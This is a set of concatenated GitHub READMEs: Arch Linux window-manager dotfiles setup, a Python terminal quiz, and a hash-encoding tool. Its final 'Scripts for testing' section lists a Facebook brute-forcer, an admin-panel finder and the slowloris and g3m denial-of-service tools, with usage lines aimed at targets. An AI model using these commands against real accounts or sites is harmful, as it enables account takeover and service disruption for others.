# My dotfiles <3

<img alt="dotfiles" width="200" src="https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/dotfiles-logo.png">

### Some settings for i3wm, Awesomewm, Monsterwm, Bspwm and several scripts.


* See [I3](https://i3wm.org/)
* See [Awesome](https://awesome.naquadah.org/)
* See [Monster](https://github.com/c00kiemon5ter/monsterwm)
* See [Bspwm](https://github.com/baskerville/bspwm)

> For more [screenshots](https://github.com/Sup3r-Us3r/MyDotfiles/tree/master/Screenshots) of my system.


### See some screenshot of these customizations.

I3wm
![I3][screenshot1]

Awesomewm
![Awesome][screenshot2]

Monsterwm
![Monster][screenshot3]

Bspwm
![Bspwm][screenshot4]

My script slideshow
![Slideshow][screenshot5]

[screenshot1]:https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/screenshot5.png
[screenshot2]:https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/screenshot9.png
[screenshot3]:https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/screenshot8.png
[screenshot4]:https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/screenshot13.png
[screenshot5]:https://raw.githubusercontent.com/Sup3r-Us3r/MyDotfiles/master/Screenshots/script-slide.gif

### Installation and dependencies

For I3wm:
```sh
$ sudo pacman -S i3 lm_sensors mpc feh hddtemp nitrogen mpd ncmpcpp conky git
$ yaourt -S i3blocks ttf-inconsolata ttf-font-awesome ttf-dejavu terminus-font-ttf

```

For Awesomewm:
```sh
$ sudo pacman -S awesome lua conky git
$ mkdir ~/.config/awesome
$ cd ~/.config/awesome && rm -rf lain/
$ git clone https://github.com/copycat-killer/lain.git
$ cp rc.lua.holo rc.lua 
/// Example rc.lua.holo more there are others within the directory ~/.config/awesome only give cp rc.lua.theme rc.lua

```

For Monsterwm:
```sh
$ sudo pacman -S git conky dzen2
$ cd ~/.config/
$ git clone https://github.com/c00kiemon5ter/monsterwm.git
$ cd monsterwm
$ cp config.def.h config.h
$ nano config.h
$ make
$ sudo make clean install

```

For Bspwm:
```sh
$ sudo pacman -S bspwm sxhkd lm_sensors mpc hddtemp nitrogen mpd ncmpcpp git
$ yaourt -S yabar-git ttf-inconsolata ttf-font-awesome ttf-dejavu terminus-font-ttf
$ mkdir ~/.config/bspwm
$ cd ~/.config/bspwm
$ touch bspwmrc && nano bspwmrc ///Paste this = https://github.com/Sup3r-Us3r/dotfiles/blob/master/config/bspwm/bspwmrc
$ sudo chmod +x bspwmrc
$ mkdir ~/.config/sxhkd
$ cd ~/.config/sxhkd
$ touch sxhkdrc && nano sxhkdrc ///Paste this = https://github.com/Sup3r-Us3r/dotfiles/blob/master/config/sxhkd/sxhkdrc

```

### Installation and configuration Mpd & Ncmpcpp

Mpd:
```sh
$ sudo pacman -S mpd
$ sudo systemctl stop mpd
$ sudo systemctl disable mpd
$ mkdir -p ~/.mpd/playlists
$ touch ~/.mpd/{mpd.db,mpd.log,mpd.pid,mpdstate}
$ nano ~/.mpd/mpd.conf
/// Paste this = http://pastebin.com/2AqeAtXU | But remember to replace "ghost" for your username and the directory of musics.

```

Ncmpcpp:
```sh
$ sudo pacman -S ncmpcpp
$ mkdir ~/.ncmpcpp
$ nano ~/.ncmpcpp/config
/// Paste this = http://pastebin.com/0QARNzKH

```

### Note in English
I taught how to install, configure, and meet the general dependencies, it is you use my settings and replace the standards.

### Note in Portuguese
Eu ensinei como instalar, configurar e satisfazer as dependências de modo geral, cabe você usar minhas configurações e substituir pelas padrões.


``


# Spy-Quiz

<img alt="python-logo" width="180" src="https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/python-logo.png">

### Veja mais em:

* [Python](https://www.python.org/)
* [Arch Linux](https://www.archlinux.org/)


### Screenshots do Desenvolvimento e Conclusão.

`Spyquiz.py`
![Spyquiz.py][screenshot1]

`Url.py`
![Url.py][screenshot2]

`Início`
![Início][screenshot3]

`Sobre`
![Sobre][screenshot4]


[screenshot1]:https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/2016-11-11-12%3A37%3A32.png
[screenshot2]:https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/2016-11-11-12%3A37%3A35.png
[screenshot3]:https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/2016-11-11-12%3A33%3A21.png
[screenshot4]:https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/2016-11-11-12%3A33%3A32.png

### Sobre o projeto.

> O Spy-Quiz tem por finalidade, ajudar os entusiatas e estudante de tecnologia da informação, com desafios para você resolver e passar para o próximo nível e o mais legal é que tudo roda no próprio terminal, ele foi desenvolvido em [Python 3.5](https://www.python.org/) e o Sistema utilizado foi o [Arch Linux](https://www.archlinux.org)

* Desenvolvedores [Sup3r-Us3r](https://github.com/Sup3r-Us3r) & [M4GN4S3C](https://magnasec.github.io/)

### Instalação e uso.

```sh
$ sudo pacman -S git
$ git clone https://github.com/Sup3r-Us3r/Spy-Quiz.git
$ cd Spy-Quiz
$ sudo chmod +x spyquiz.py && sudo chmod +x url.py
```
Para usar.
```sh
$ ./spyquiz.py
```
> Requer python3.5


# Clique [<img alt="play-video" width="23" src="https://raw.githubusercontent.com/Sup3r-Us3r/Spy-Quiz/master/Screenshots/play-video.png">](https://www.youtube.com/watch?v=T0mtecBoh70) e veja o vídeo de demonstração:


``

# HashCode
<img alt="python-logo" width="180" src="https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/python-logo.png">

### See more at:

* [Python](https://www.python.org/)
* [Arch Linux](https://www.archlinux.org/)

### About:

Its purpose is to encode your desired hash text.

* Developer: The whole project was the one I did, with the goal of expedite the process of encode text to hash's.

### Screenshots of different types of hash in operation:

`Main`
![Main][screenshot1]

`Md5`
![Md5][screenshot2]

`Sha1`
![Sha1][screenshot3]

`Sha224`
![Monster][screenshot4]

`Sha256`
![Sha256][screenshot5]

`Sha384`
![Sha384][screenshot6]

`Sha512`
![Sha512][screenshot7]

`Base64`
![Base64][screenshot8]

[screenshot1]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A05%3A55.png
[screenshot2]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A06%3A06.png
[screenshot3]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A06%3A16.png
[screenshot4]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A06%3A27.png
[screenshot5]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A06%3A41.png
[screenshot6]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A06%3A58.png
[screenshot7]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A07%3A15.png
[screenshot8]:https://raw.githubusercontent.com/Sup3r-Us3r/HashCode/master/Screenshots/2016-11-11-16%3A07%3A34.png

### Installation and use.

```sh
$ sudo pacman -S git // or sudo apt-get install git
$ git clone https://github.com/Sup3r-Us3r/HashCode.git
$ cd HashCode/
$ sudo chmod +x hashcode.py
```
Use.
```sh
$ ./hashcode.py
```
> Dependency - Python3.5

> See more other projects on my GitHub [MyDotifiles](https://github.com/Sup3r-Us3r/MyDotfiles) and [Spy-Quiz](https://github.com/Sup3r-Us3r/Spy-Quiz)


``

# Scripts for testing.

* fb-brute.pl = Bruteforce for Facebook
* hash_id_v1.1.py = Hash Identifier
* painel.pl = Admin Control Panel Finder
* slowloris.pl = Denial of Service
* g3m = Denial of Service

How to Install and use
----

`fb-brute.pl`
```sh
$ sudo chmod +x fb-brute.pl
$ perl fb-brute.pl id-user-facebook wordlist.txt
```

`hash_id_v1.1.py`
```sh
$ sudo chmod +x hash_id_v1.1.py
$ python2 hash_id_v1.1.py
``` 

`painel.pl`
```sh
$ sudo chmod +x painel.pl
$ perl painel.pl
```

`slowloris.pl`
```sh
$ sudo chmod +x slowloris.pl
$ perl slowloris.pl -dns www.target.com -port 80 -timeout 1 -num 1000 -tcpto 5
$ perl slowloris.pl -dns IP
```

`g3m`
```sh
$ sudo chmod +x g3m
$ ./g3m -h ip -T 3              #Attack private internet
$ ./g3m -h ip -T 3 -p 80,80     #Attack websites
```
